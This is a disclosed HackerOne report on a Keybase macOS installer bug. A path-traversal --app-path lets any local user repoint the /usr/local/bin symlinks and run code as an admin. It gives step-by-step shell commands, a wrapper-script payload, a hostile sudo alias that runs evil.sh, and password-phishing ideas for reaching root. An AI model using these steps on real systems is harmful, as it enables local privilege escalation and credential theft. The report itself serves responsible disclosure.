---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '485407'
original_report_id: '485407'
title: From nobody to somebody
weakness: Privilege Escalation
team_handle: keybase
created_at: '2019-01-24T16:33:15.416Z'
disclosed_at: '2020-01-24T23:20:20.068Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 47
tags:
- hackerone
- privilege-escalation
---

# From nobody to somebody

## Metadata

- HackerOne Report ID: 485407
- Weakness: Privilege Escalation
- Program: keybase
- Disclosed At: 2020-01-24T23:20:20.068Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Short description

Using a bug any user can change the `keybase` and `git-remote-keybase` symlinks in the `/usr/locale/bin` folder. We can exploit this to run arbitrary code as the user.

# Steps to reproduce
1. In the example I will use the low privileged `nobody` account (could be any other account) and I will target the `u3mur4` admin user.
```bash
➜ ~ sudo -u nobody bash
Password:
bash-3.2$ id
uid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)
bash-3.2$
```

2.  Create the `/var/tmp/poc/Contents/SharedSupport/bin` folder structure with 2 symlinks which are pointing to the original `keybase` and `git-remote-keybase` binaries.
```bash
bash-3.2$ mkdir -p /var/tmp/poc/Contents/SharedSupport/bin
bash-3.2$ cd /var/tmp/poc/Contents/SharedSupport/bin
bash-3.2$ ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/keybase keybase
bash-3.2$ ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase git-remote-keybase
bash-3.2$ ls -lah .
total 16
drwxr-xr-x  4 nobody  wheel   136B Jan 24 03:31 .
drwxr-xr-x  3 nobody  wheel   102B Jan 24 03:30 ..
lrwxr-xr-x  1 nobody  wheel    71B Jan 24 03:31 git-remote-keybase -> /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase
lrwxr-xr-x  1 nobody  wheel    60B Jan 24 03:31 keybase -> /Applications/Keybase.app/Contents/SharedSupport/bin/keybase
bash-3.2$
```
> The `nobody` user has write permission to `/var/tmp` directory and content of the directory is preserved between reboots. 

3. Run the keybase installer command with `--app-path=/Applications/Keybase.app/../../var/tmp/poc` and the `install-cli` flag.
```bash
bash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path=/Applications/Keybase.app/../../var/tmp/poc --install-cli
[REMOVED]
01.24.2019 03:39:54.411 KBCommandLine:38[DEBG] Helper: addToPath({
    appName = Keybase;
    directory = "/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin";
    name = keybase;
})
01.24.2019 03:39:54.414 KBCommandLine:40[DEBG] Result: {
    path = "/usr/local/bin/keybase";
}
01.24.2019 03:39:54.414 KBCommandLine:47[DEBG] Helper: addToPath({
    appName = Keybase;
    directory = "/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin";
    name = "git-remote-keybase";
})
01.24.2019 03:39:54.419 KBCommandLine:49[DEBG] Result: {
    path = "/usr/local/bin/git-remote-keybase";
}
01.24.2019 03:39:54.419 KBCommandLine:131[INFO] Link resolved to path: /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase <=> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase
01.24.2019 03:39:54.419 KBInstaller:45[INFO] Install complete
[REMOVED]
bash-3.2$
```

4. Check that in the `/usr/local/bin` folder the `keybase` and `git-remote-keybase` links are changed to our specified links.
```bash
bash-3.2$ ls -lah /usr/local/bin/
total 80
drwxrwxr-x  12 u3mur4  admin   408B Jan 24 02:44 .
drwxr-xr-x  15 root    wheel   510B Jan 16 07:33 ..
lrwxr-xr-x   1 u3mur4  admin    28B Jan 16 05:32 brew -> /usr/local/Homebrew/bin/brew
-rwxr-xr-x   1 root    admin   538B Jan 16 06:30 fuzzy_match
lrwxr-xr-x   1 u3mur4  admin    89B Jan 24 02:44 git-remote-keybase -> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/git-remote-keybase
lrwxr-xr-x   1 u3mur4  admin    29B Jan 16 05:44 htop -> ../Cellar/htop/2.2.0/bin/htop
lrwxr-xr-x   1 u3mur4  admin    78B Jan 24 02:44 keybase -> /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase
-rwxr-xr-x   1 root    admin   526B Jan 16 06:30 pod
-rwxr-xr-x   1 root    admin   534B Jan 16 06:30 sandbox-pod
-rwxr-xr-x   1 root    admin   532B Jan 16 06:30 xcodeproj
lrwxr-xr-x   1 u3mur4  admin    29B Jan 23 22:42 zsh -> ../Cellar/zsh/5.6.2_1/bin/zsh
lrwxr-xr-x   1 u3mur4  admin    35B Jan 23 22:42 zsh-5.6.2 -> ../Cellar/zsh/5.6.2_1/bin/zsh-5.6.2
```
> Notice that the `nobody` account has no permission the change these links directly.

5. Remove our links in the `/var/tmp/poc/Contents/SharedSupport/bin/` folder and create some executable files. In the example I will just simply use the `id` command and I forward the flags to the original binaries.
```bash
bash-3.2$ ls
git-remote-keybase	keybase
bash-3.2$ rm keybase git-remote-keybase
bash-3.2$ cat <<EOF >> keybase
#!/bin/bash
id >> /tmp/out
/Applications/Keybase.app/Contents/SharedSupport/bin/keybase \$@
EOF
bash-3.2$ cat <<EOF >> git-remote-keybase
#!/bin/bash
id >> /tmp/out
/Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase \$@
EOF
bash-3.2$ chmod +x keybase git-remote-keybase
```

6. Wait until the `u3mur4` account using the `git clone keybase://` or the `keybase` command.
```bash
➜  ~ id
uid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
➜  ~ keybase
NAME:
   keybase - Keybase command line client.
[REMOVED]
```
Check the `/tmp/out` file. 
```bash
bash-3.2$ cat /tmp/out
uid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
bash-3.2$
```
> Notice that the `u3mur4` account executed our binary because we could change the symlinks in the `/usr/local/bin` directory. From now on we can access any file and run arbitrary command as the targeted account. Also we can access the `private` keybase folder of the user and other sensitive data.

7. How to become root?

Because we can run arbitrary code as the targeted user we have multiple ways to achieve root privileges. By using misconfigurations with a little bit of social engineering you can get your victim to escalate you to root without realizing it.

-  By adding this line to the users .bash_profile: `alias sudo='sudo sh -c '\''evil.sh & exec "$@"'\'' sh'`. We can change the behavior of what happens when the user runs “sudo”.

- AppleScript is fairly simple, and can be used to phish for passwords for nearly anything.  If you can acquire the password of an administrator user, you can escalate to root. So when the user runs the keybase binary we can create a popup that the 'keybase helper need to update...' and the user have to enter the password.

- This will work up until El Capitan: The sudoers policy caches credentials for 5 minutes, unless overridden in sudoers(5). What this means is that once a user runs sudo, they can run a command with sudo again for up to 5 minutes without having to enter their password again.

- Short version (see source 2): Homebrew changes the permissions on `/usr/local/bin` to the user (or any process running as the user) is able to write files to it and give those files executable permissions. Now if you (or someone else, or some other program) were to place a program called sudo in /usr/local/bin, then every time you typed sudo it would be that program that would be executed, not the real one.

- etc...

[source1 - privilege-escalation-on-os-x-without-exploits](https://www.n00py.io/2016/10/privilege-escalation-on-os-x-without-exploits/)

[source2 - how-homebrew-invites-users-to-get-pwned](https://applehelpwriter.com/2018/03/21/how-homebrew-invites-users-to-get-pwned/)

# Why can we change the symlinks? 
> **the 3th item is the most important**

1. 
In the [client/osx/Installer/Options.m:125](https://github.com/keybase/client/blob/master/osx/Installer/Options.m#L125) file
```
NSString *servicePath = [self.appPath stringByAppendingPathComponent:@"Contents/SharedSupport/bin"];
```
the code appends the `Contents/SharedSupport/bin` path to the specified appPath. We specified appPath in step 2 as `/Applications/Keybase.app/../../var/tmp/poc`. After appending the path, the servicePath becomes `/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin` which resolves to `/var/tmp/poc/Contents/SharedSupport/bin`. That is why we created the directory structure specified in step 2.

2. In the [client/osx/KBKit/KBKit/Component/KBCommandLine.m:26](https://github.com/keybase/client/blob/master/osx/KBKit/KBKit/Component/KBCommandLine.m#L26) file
```
...
  if (![self.config isInApplications:self.servicePath]) {
    completion(KBMakeWarning(@"Command line install is not supported from this location: %@", self.servicePath));
    return;
  }
...
```
the code checks that the servicePath start with `/Application`. That is why we specify the `/Application...` appPath with the `../..` components in step 3.

3. In the [client/osx/Helper/KBHelper.m:371](https://github.com/keybase/client/blob/master/osx/Helper/KBHelper.m#L371) file the `install` function will call the [checkAbsolutePath](https://github.com/keybase/client/blob/master/osx/Helper/fs.m#L71-L91) function with `path=/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase` and `prefix=/Applications/Keybase.app` arguments.
```
/*
 * check that the path path has the prefix prefix, being wise to
 * whatever attacks people will throw at us, like /a/b/../../.., etc
 */
+(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {
    if (!prefix.absolutePath) {
        return NO;
    }
    if (!path.absolutePath) {
        return NO;
    }
    NSArray *a = [path.stringByStandardizingPath componentsSeparatedByString:@"/"];
    NSArray *b = [prefix.stringByStandardizingPath componentsSeparatedByString:@"/"];
    if (a.count < b.count) {
        return NO;
    }

    for (int i = 0; i < b.count; i++) {
        if (![a[i] isEqualToString:b[i]]) {
            return NO;
        }
    }
    return YES;
}
```
The `a` (path) array becomes `["", Application, "Keybase.app", Contents, SharedSupport, bin, keybase]`. **So the stringByStandardizingPath function will resolves the /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase link** that is why it will start as the b `["", Application, "Keybase.app"]` array. The function will return `YES` and the add `addToPath` function will create the link.

4. In the [client/osx/KBKit/KBKit/Component/KBCommandLine.m:125-137](https://github.com/keybase/client/blob/master/osx/KBKit/KBKit/Component/KBCommandLine.m#L125-L137) file
```
- (BOOL)linkedToServicePath {
  NSString *linkDir = @"/usr/local/bin";
  NSString *linkPath = [NSString stringWithFormat:@"%@/%@", linkDir, self.config.serviceBinName];
  NSString *shouldResolveToPath = [NSString stringWithFormat:@"%@/%@", self.servicePath, self.config.serviceBinName];
  if ([NSFileManager.defaultManager fileExistsAtPath:linkDir]) {
    NSString *resolved = [self resolveLinkPath:linkPath];
    DDLogInfo(@"Link resolved to path: %@ <=> %@", resolved, shouldResolveToPath);
    if ([resolved isEqualToString:shouldResolveToPath]) {
      return YES;
    }
  }
  return NO;
}
```
the code checks that `/usr/local/bin` + `serviceBinName` link resolves to the same place as our specified `servicePath` (appPath + Contents/SharedSupport/bin) + `serviceBinName`. That is why we created two symlink to the original binaries in step 2.

> Notice that we have permission to remove, modify later this link, (in step 4 and 5).

## Impact

Unauthorized access is possible which impacts the confidentially, integrity, and availability of the system.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
